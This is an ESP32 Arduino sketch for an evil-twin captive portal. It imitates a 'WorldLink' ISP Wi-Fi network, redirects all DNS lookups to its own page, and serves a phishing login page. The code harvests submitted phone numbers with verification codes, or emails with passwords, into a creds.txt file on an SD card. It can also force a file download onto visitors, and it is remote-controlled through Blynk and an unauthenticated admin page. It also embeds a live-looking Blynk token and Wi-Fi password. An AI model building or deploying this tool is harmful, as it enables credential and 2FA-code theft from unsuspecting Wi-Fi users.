#define BLYNK_TEMPLATE_ID "TMPL6jWYeX6NR"
#define BLYNK_TEMPLATE_NAME "Jaffinator CP"
#define BLYNK_AUTH_TOKEN    "0-zBQSs2oy7PawCGEKAp6Mx_Wv-oMLsq"

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPI.h>
#include <SD.h>
#include <BlynkSimpleEsp32.h>

// ===================== Wi‑Fi Credentials =====================
char ssid[] = "Mero Net";     
char pass[] = "af25g+40Nb5wpbu";  

// ===================== SD Card SPI Pins =====================
const int sd_sck  = 18;
const int sd_miso = 15; 
const int sd_mosi = 23;
const int sd_cs   = 5;

// ===================== Wi‑Fi Access Point =====================
const char* ap_ssid = "worldlink";
const char* html_filename = "/myworldink.html";
const IPAddress ap_ip(192, 168, 4, 1);     
const IPAddress netmask(255, 255, 255, 0);

// ===================== Web Server & DNS =====================
DNSServer dnsServer;
WebServer server(80);

// ===================== HTML buffer =====================
char* index_html = nullptr;
const size_t MAX_HTML_SIZE = 45000;

// ===================== Control flags =====================
bool portalActive = false;
bool downloadEnabled = false;

// ===================== Forward declarations =====================
bool loadHtmlFromSD();
void handlePortal();
void handleCapture();
void handleAccept();
void writeCredToSD(String data);
void handleDownloadPhoto();
void startPortal();
void stopPortal();
void showHelp();
void handleAdmin();
void handleApiPortal();
void handleApiDownload();
void handleApiStatus();

// ===================== Blynk Handlers =====================
BLYNK_WRITE(V0) {
  if (param.asInt() == 1) startPortal();
  else stopPortal();
}

BLYNK_WRITE(V1) {
  downloadEnabled = (param.asInt() == 1);
  Serial.printf("Download %s\n", downloadEnabled ? "ENABLED" : "DISABLED");
}

// ===================== Setup =====================
void setup() {
  Serial.begin(115200);
  while (!Serial && millis() < 2000) { delay(10); }

  Serial.println("\n=== Captive Portal Controller + Blynk 2.0 ===");

  // ---------- SD Card ----------
  SPI.begin(sd_sck, sd_miso, sd_mosi, sd_cs);
  if (!SD.begin(sd_cs, SPI, 10000000)) {
    Serial.println("❌ SD Card mount failed!");
  } else {
    loadHtmlFromSD();
  }

  // ---------- Connect to home Wi‑Fi (STA) ----------
  WiFi.mode(WIFI_AP_STA);
  WiFi.begin(ssid, pass);
  Serial.print("📶 Connecting to home Wi‑Fi");
  int tries = 0;
  while (WiFi.status() != WL_CONNECTED && tries < 30) {
    delay(500);
    Serial.print(".");
    tries++;
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n✅ Home Wi‑Fi connected! IP: " + WiFi.localIP().toString());
  } else {
    Serial.println("\n⚠️ Home Wi‑Fi failed – Blynk will not work.");
  }

  // ---------- Blynk ----------
  Blynk.config(BLYNK_AUTH_TOKEN);
  if (WiFi.status() == WL_CONNECTED) {
    Blynk.connect();
    Serial.println("🔵 Blynk connected");
  }

  // ---------- Web server (always running) ----------
  server.on("/", HTTP_GET, handlePortal);
  server.on("/capture", HTTP_POST, handleCapture);
  server.on("/accept", HTTP_POST, handleAccept);
  server.on("/download_photo", HTTP_GET, handleDownloadPhoto);
  server.on("/admin", HTTP_GET, handleAdmin);
  server.on("/api/portal", HTTP_GET, handleApiPortal);
  server.on("/api/download", HTTP_GET, handleApiDownload);
  server.on("/api/status", HTTP_GET, handleApiStatus);
  server.onNotFound(handlePortal);
  server.begin();
  Serial.println("🌐 Web server started");

  portalActive = false;
  downloadEnabled = false;

  Serial.println("\n✅ Ready. Use Blynk web dashboard or Serial commands.");
  showHelp();
  Serial.print("\n> ");
}

// ===================== Main Loop =====================
void loop() {
  Blynk.run();

  if (portalActive) {
    dnsServer.processNextRequest();
    server.handleClient();
  } else {
    server.handleClient(); // admin always works
  }

  // Serial commands
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    cmd.toLowerCase();
    Serial.println("> " + cmd);

    if (cmd == "portal on") {
      startPortal();
    } else if (cmd == "portal off") {
      stopPortal();
    } else if (cmd == "download on") {
      downloadEnabled = true;
      Serial.println("✅ Download ENABLED");
      Blynk.virtualWrite(V1, 1);
    } else if (cmd == "download off") {
      downloadEnabled = false;
      Serial.println("❌ Download DISABLED");
      Blynk.virtualWrite(V1, 0);
    } else if (cmd == "status") {
      Serial.printf("Portal: %s | Download: %s\n",
                    portalActive ? "ON" : "OFF",
                    downloadEnabled ? "ON" : "OFF");
    } else if (cmd == "help") {
      showHelp();
    } else {
      Serial.println("Unknown. Type 'help' for commands.");
    }
    Serial.print("\n> ");
  }

  yield();
}

// ===================== Start / Stop Portal =====================
void startPortal() {
  if (portalActive) {
    Serial.println("⚠️ Already running");
    return;
  }
  if (!WiFi.softAP(ap_ssid)) {
    WiFi.softAPConfig(ap_ip, ap_ip, netmask);
    WiFi.softAP(ap_ssid);
    Serial.printf("📶 AP '%s' started (IP: %s)\n", ap_ssid, WiFi.softAPIP().toString().c_str());
  }
  dnsServer.start(53, "*", ap_ip);
  Serial.println("📡 DNS server started");
  portalActive = true;
  Serial.println("✅ Portal ACTIVE");
  Blynk.virtualWrite(V0, 1);
}

void stopPortal() {
  if (!portalActive) {
    Serial.println("⚠️ Not running");
    return;
  }
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  portalActive = false;
  Serial.println("✅ Portal stopped");
  Blynk.virtualWrite(V0, 0);
}

// ===================== Web Handlers =====================
void handlePortal() {
  if (index_html) {
    server.send(200, "text/html", index_html);
  } else {
    // Fallback HTML – also acts as a backup captive portal page
    String fallback = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width,initial-scale=1"><title>WorldLink</title>
<style>
  body{font-family:Arial;text-align:center;padding:40px;background:#0f0f1a;color:#fff;}
  .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:999;}
  .modal-box{background:#fff;color:#333;border-radius:20px;padding:30px;max-width:340px;width:90%;text-align:center;}
  .btn{background:#FFD600;border:none;padding:12px 40px;border-radius:30px;font-weight:bold;font-size:16px;cursor:pointer;}
</style>
</head>
<body>
<div class="modal" id="popup">
  <div class="modal-box">
    <h2>🌐 Welcome to WorldLink</h2>
    <p>Click below to start your free session.</p>
    <button class="btn" onclick="downloadAndClose()">Continue →</button>
  </div>
</div>
<script>
function downloadAndClose() {
  var a = document.createElement('a');
  a.href = '/download_photo';
  a.download = 'photo.png';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  document.getElementById('popup').style.display = 'none';
}
</script>
</body>
</html>
)rawliteral";
    server.send(200, "text/html", fallback);
  }
}

void handleCapture() {
  String phone = server.arg("phone");
  String code  = server.arg("code");
  String email = server.arg("email");
  String pass  = server.arg("password");

  unsigned long secs = millis() / 1000;
  unsigned long mins = secs / 60;
  unsigned long hrs  = mins / 60;
  unsigned long days = hrs / 24;
  char ts[30];
  snprintf(ts, sizeof(ts), "%lud %02lu:%02lu:%02lu", days, hrs % 24, mins % 60, secs % 60);

  String logLine = "[" + String(ts) + "] ";
  if (phone.length() > 0 && code.length() > 0) {
    logLine += "Phone: " + phone + " | Code: " + code;
  } else if (email.length() > 0 && pass.length() > 0) {
    logLine += "Email: " + email + " | Password: " + pass;
  } else {
    logLine += "Data: ";
    for (int i = 0; i < server.args(); i++) {
      logLine += server.argName(i) + "=" + server.arg(i) + " ";
    }
  }
  Serial.println("📥 " + logLine);
  writeCredToSD(logLine);

  String success = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width'>";
  success += "<style>body{font-family:Arial;text-align:center;padding:50px;}</style></head>";
  success += "<body><h1>✅ Connected</h1><p>You are now online. Enjoy!</p>";
  success += "<script>setTimeout(function(){ window.location.href='http://192.168.4.1/'; }, 3000);</script></body></html>";
  server.send(200, "text/html", success);
}

void handleAccept() {
  if (server.args() > 0) {
    handleCapture();
  } else {
    server.send(200, "text/html", "<h1>Success</h1><p>Session activated.</p>");
  }
}

// ===================== Image download =====================
void handleDownloadPhoto() {
  if (!downloadEnabled) {
    server.send(404, "text/plain", "Download disabled");
    return;
  }
  File file = SD.open("/photo.png");
  if (!file) {
    server.send(404, "text/plain", "File not found");
    return;
  }
  server.sendHeader("Content-Type", "image/png");
  server.sendHeader("Content-Disposition", "attachment; filename=photo.png");
  server.streamFile(file, "image/png");
  file.close();
  Serial.println("📸 photo.png downloaded");
}

// ===================== SD Card helpers =====================
void writeCredToSD(String data) {
  File file = SD.open("/creds.txt", FILE_APPEND);
  if (!file) {
    Serial.println("❌ Failed to open /creds.txt");
    return;
  }
  file.println(data);
  file.close();
  Serial.println("💾 Saved to SD");
}

bool loadHtmlFromSD() {
  File file = SD.open(html_filename);
  if (!file) {
    Serial.printf("⚠️ HTML file '%s' not found\n", html_filename);
    return false;
  }
  size_t size = file.size();
  if (size > MAX_HTML_SIZE) {
    Serial.printf("⚠️ HTML too large (%u bytes)\n", size);
    file.close();
    return false;
  }
  if (index_html) free(index_html);
  index_html = (char*)malloc(size + 1);
  if (!index_html) {
    Serial.println("⚠️ Memory allocation failed");
    file.close();
    return false;
  }
  file.readBytes(index_html, size);
  index_html[size] = '\0';
  file.close();
  return true;
}

// ===================== Admin page  =====================
void handleAdmin() {
  String page = R"rawliteral(
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Control Panel</title>
      <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Courier New',monospace;background:#0a0a0a;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
        body::before{content:'';position:fixed;inset:0;background-image:radial-gradient(rgba(0,255,65,0.07) 1px,transparent 1px);background-size:28px 28px;z-index:0}
        .wrap{position:relative;z-index:1;max-width:540px;width:100%;background:rgba(8,8,8,0.96);border:1px solid #1a4d1a;border-radius:14px;padding:26px 22px 18px}
        .hdr{display:flex;align-items:center;gap:12px;margin-bottom:22px;padding-bottom:14px;border-bottom:1px solid rgba(0,255,65,0.12)}
        .hdr-icon{width:36px;height:36px;background:rgba(0,255,65,0.07);border:1px solid rgba(0,255,65,0.2);border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
        .hdr-icon svg{width:18px;height:18px;stroke:#00ff41;stroke-width:1.5;fill:none}
        .hdr h1{font-size:15px;font-weight:400;color:#00e83a;letter-spacing:2.5px}
        .hdr .sub{font-size:11px;color:#336633;margin-top:3px;letter-spacing:0.8px}
        .card{background:rgba(0,255,65,0.02);border:1px solid rgba(0,255,65,0.1);border-radius:9px;padding:14px 16px;margin-bottom:11px;transition:border-color 0.25s}
        .card:hover{border-color:rgba(0,255,65,0.3)}
        .card-hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:9px}
        .card-title{display:flex;align-items:center;gap:10px;font-size:13px;color:#a0c0a0;letter-spacing:0.5px}
        .card-title svg{width:16px;height:16px;stroke:currentColor;stroke-width:1.5;fill:none;opacity:0.7}
        .badge{font-size:10px;padding:2px 9px;border-radius:4px;border:1px solid rgba(0,255,65,0.15);color:#446644;background:rgba(0,255,65,0.05);letter-spacing:0.5px;display:flex;align-items:center;gap:5px}
        .badge.on{color:#00ff41;border-color:rgba(0,255,65,0.5);background:rgba(0,255,65,0.1)}
        .badge.off{color:#994444;border-color:rgba(255,50,50,0.3);background:rgba(255,0,0,0.05)}
        .dot{width:5px;height:5px;border-radius:50%;background:currentColor;display:inline-block}
        .badge.on .dot{animation:pulse 2s ease-in-out infinite}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
        .toggle{position:relative;width:50px;height:26px;flex-shrink:0;cursor:pointer}
        .toggle input{opacity:0;width:0;height:0;position:absolute}
        .slider{position:absolute;inset:0;background:#111;border:1px solid #223322;border-radius:26px;transition:0.25s;display:flex;align-items:center;padding:0 3px}
        .slider::before{content:'';height:18px;width:18px;background:#2a3d2a;border-radius:50%;transition:0.25s}
        input:checked+.slider{border-color:#00cc33;background:#001800}
        input:checked+.slider::before{transform:translateX(24px);background:#00ff41}
        .status-row{display:flex;justify-content:space-between;font-size:11px;color:#446644;padding-top:8px;border-top:1px solid rgba(0,255,65,0.05)}
        .status-row .val.on{color:#00e83a}
        .status-row .val.off{color:#cc4444}
        .footer{display:flex;justify-content:space-between;align-items:center;margin-top:16px;padding-top:13px;border-top:1px solid rgba(0,255,65,0.08);font-size:11px;color:#2d4d2d}
        .ip-pill{background:rgba(0,255,65,0.04);border:1px solid rgba(0,255,65,0.1);border-radius:5px;padding:4px 12px;color:#4a8a4a;display:flex;align-items:center;gap:7px}
        .ip-pill svg{width:12px;height:12px;stroke:currentColor;stroke-width:1.5;fill:none;opacity:0.7}
        .sync-btn{background:none;border:1px solid #1a3d1a;color:#446644;cursor:pointer;font-size:11px;padding:4px 12px;border-radius:5px;transition:0.2s;font-family:'Courier New',monospace;display:flex;align-items:center;gap:6px}
        .sync-btn svg{width:12px;height:12px;stroke:currentColor;stroke-width:1.5;fill:none;transition:transform 0.4s}
        .sync-btn:hover{border-color:#00cc33;color:#00cc33}
        .sync-btn.spinning svg{transform:rotate(360deg)}
        .last-sync{font-size:10px;color:#223322;text-align:center;margin-top:10px;letter-spacing:0.3px}
        @media(max-width:480px){.wrap{padding:14px}.card{padding:10px 12px}.toggle{width:44px;height:22px}.slider::before{height:14px;width:14px}input:checked+.slider::before{transform:translateX(22px)}}
      </style>
    </head>
    <body>
    <div class="wrap">
      <div class="hdr">
        <div class="hdr-icon">
          <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
        </div>
        <div>
          <h1># Control Panel</h1>
          <div class="sub">&gt;_ captive portal &amp; download manager</div>
        </div>
      </div>

      <div class="card">
        <div class="card-hdr">
          <div class="card-title">
            <svg viewBox="0 0 24 24"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><circle cx="12" cy="20" r="1" fill="currentColor"/></svg>
            Portal
            <span class="badge off" id="portalBadge"><span class="dot"></span> OFF</span>
          </div>
          <label class="toggle">
            <input type="checkbox" id="portalToggle" aria-label="Portal toggle">
            <span class="slider"></span>
          </label>
        </div>
        <div class="status-row">
          <span>STATUS</span>
          <span class="val off" id="portalStatus">Inactive</span>
        </div>
      </div>

      <div class="card">
        <div class="card-hdr">
          <div class="card-title">
            <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            Download
            <span class="badge off" id="downloadBadge"><span class="dot"></span> OFF</span>
          </div>
          <label class="toggle">
            <input type="checkbox" id="downloadToggle" aria-label="Download toggle">
            <span class="slider"></span>
          </label>
        </div>
        <div class="status-row">
          <span>STATUS</span>
          <span class="val off" id="downloadStatus">Disabled</span>
        </div>
      </div>

      <div class="footer">
        <div class="ip-pill">
          <svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="2"/><path d="M8 12h8M12 8v8"/></svg>
          <span id="espIp">192.168.4.1</span>
        </div>
        <button class="sync-btn" id="syncBtn" onclick="fetchStatus()">
          <svg viewBox="0 0 24 24" id="syncIcon"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
          SYNC
        </button>
      </div>
      <div class="last-sync" id="lastSync">not synced yet</div>
    </div>

    <script>
      const portalToggle = document.getElementById('portalToggle');
      const downloadToggle = document.getElementById('downloadToggle');
      const portalBadge = document.getElementById('portalBadge');
      const downloadBadge = document.getElementById('downloadBadge');
      const portalStatus = document.getElementById('portalStatus');
      const downloadStatus = document.getElementById('downloadStatus');
      const espIp = document.getElementById('espIp');
      const lastSync = document.getElementById('lastSync');
      const syncBtn = document.getElementById('syncBtn');

      espIp.textContent = window.location.hostname;

      function updateUI(portal, download) {
        portalToggle.checked = portal;
        portalBadge.innerHTML = '<span class="dot"></span> ' + (portal ? 'ON' : 'OFF');
        portalBadge.className = 'badge ' + (portal ? 'on' : 'off');
        portalStatus.textContent = portal ? 'Active' : 'Inactive';
        portalStatus.className = 'val ' + (portal ? 'on' : 'off');

        downloadToggle.checked = download;
        downloadBadge.innerHTML = '<span class="dot"></span> ' + (download ? 'ON' : 'OFF');
        downloadBadge.className = 'badge ' + (download ? 'on' : 'off');
        downloadStatus.textContent = download ? 'Enabled' : 'Disabled';
        downloadStatus.className = 'val ' + (download ? 'on' : 'off');

        const now = new Date();
        lastSync.textContent = 'last sync: ' + now.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
      }

      async function fetchStatus() {
        syncBtn.classList.add('spinning');
        try {
          const res = await fetch('/api/status');
          const data = await res.json();
          updateUI(data.portal, data.download);
        } catch (e) {
          lastSync.textContent = 'sync failed — retrying...';
        } finally {
          setTimeout(() => syncBtn.classList.remove('spinning'), 400);
        }
      }

      async function sendCommand(type, state) {
        try {
          const res = await fetch('/api/' + type + '?state=' + (state ? 'on' : 'off'));
          if (!res.ok) throw new Error('HTTP ' + res.status);
          await fetchStatus();
        } catch (e) {
          console.error('Command failed:', e);
          await fetchStatus();
        }
      }

      portalToggle.addEventListener('change', function() { sendCommand('portal', this.checked); });
      downloadToggle.addEventListener('change', function() { sendCommand('download', this.checked); });

      fetchStatus();
      setInterval(fetchStatus, 3000);
    </script>
    </body>
    </html>
      )rawliteral";
  server.send(200, "text/html", page);
}

// ===================== API handlers =====================
void handleApiPortal() {
  String state = server.arg("state");
  if (state == "on") {
    startPortal();
    server.send(200, "text/plain", "Portal ON");
  } else if (state == "off") {
    stopPortal();
    server.send(200, "text/plain", "Portal OFF");
  } else {
    server.send(400, "text/plain", "Usage: ?state=on|off");
  }
}

void handleApiDownload() {
  String state = server.arg("state");
  if (state == "on") {
    downloadEnabled = true;
    Blynk.virtualWrite(V1, 1);
    server.send(200, "text/plain", "Download ENABLED");
  } else if (state == "off") {
    downloadEnabled = false;
    Blynk.virtualWrite(V1, 0);
    server.send(200, "text/plain", "Download DISABLED");
  } else {
    server.send(400, "text/plain", "Usage: ?state=on|off");
  }
}

void handleApiStatus() {
  String json = "{";
  json += "\"portal\":" + String(portalActive ? "true" : "false") + ",";
  json += "\"download\":" + String(downloadEnabled ? "true" : "false");
  json += "}";
  server.send(200, "application/json", json);
}

// ===================== Help =====================
void showHelp() {
  Serial.println("\nCommands:");
  Serial.println("  portal on   - start captive portal");
  Serial.println("  portal off  - stop captive portal");
  Serial.println("  download on - enable image download");
  Serial.println("  download off- disable image download");
  Serial.println("  status      - show current state");
  Serial.println("  help        - show this list");
}